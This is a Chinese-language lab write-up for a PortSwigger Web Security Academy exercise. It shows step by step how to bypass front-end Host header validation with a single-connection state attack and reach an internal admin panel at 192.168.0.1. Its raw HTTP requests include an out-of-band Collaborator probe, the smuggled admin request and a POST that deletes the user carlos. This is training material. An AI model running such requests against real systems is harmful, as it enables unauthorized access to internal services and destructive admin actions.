# 实验：通过连接状态攻击绕过 Host 验证

本实验容易通过 Host 头受到基于路由的 SSRF 攻击。尽管前端服务器最初似乎对 Host 头执行了健壮的验证，但它基于接收到的第一个请求对连接上的所有请求做出了假设。

要解决本实验，请利用此行为访问位于 `192.168.0.1/admin` 的内部管理面板，然后删除用户 `carlos`。

> **提示**
>
> 解决本实验需要 [Burp Suite 2022.8.1](https://portswigger.net/burp/releases/professional-community-2022-8-1?requestededition=professional) 版本首次发布的“单连接”功能。

本实验基于 PortSwigger Research 发现的现实世界漏洞。更多详情，请查看 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#state)。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: 0a39008e030357ca826bcf1300de0013.h1-web-security-academy.net
    Connection: keep-alive
    ```

    - 响应
        ```http
        HTTP/1.1 200 OK
        Keep-Alive: timeout=10
        ```

- 尝试带外
    ```http
    GET / HTTP/1.1
    Host: 5msgieeayliwfzb50fb0zb6rkiq9e12q.oastify.com
    ```
    - 响应
        ```http
        HTTP/1.1 200 OK
        Server: Burp Collaborator https://burpcollaborator.net/
        ```
        - 成功

- 尝试访问内网主机端点
    ```http
    GET /admin HTTP/1.1
    Host: 192.168.0.1
    ```
    - 响应
        ```http
        HTTP/1.1 301 Moved Permanently
        Location: https://0a39008e030357ca826bcf1300de0013.h1-web-security-academy.net/
        Connection: close
        ```
        - 返回重定向到主页


尝试单连接攻击
- 在重复器中在“单连接”组中设置两个标签
    1. 普通端点请求
        ```http
        GET / HTTP/1.1
        Host: 0a39008e030357ca826bcf1300de0013.h1-web-security-academy.net
        Connection: keep-alive
        ```
        - 此处的 `Connection` 可省略

    2. 后续载荷连接
        ```http
        GET /admin HTTP/1.1
        Host: 192.168.0.1
        ```

- 载荷连接的服务器响应
    ```html
    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
        <input required type="hidden" name="csrf" value="ni4R9KuIEc6pU4xDuBzTh0rZQWHcBQCE">
        <label>
            Username
        </label>
        <input required type='text' name='username'>
        <button class='button' type='submit'>
            Delete user
        </button>
    </form>
    ```
    - 成功返回管理表单

- 基于管理表单构造删除端点的 POST 请求

    ```http
    POST /admin/delete HTTP/1.1
    Host: 192.168.0.1

    username=carlos&csrf=ni4R9KuIEc6pU4xDuBzTh0rZQWHcBQCE
    ```

- 发送后成功执行操作
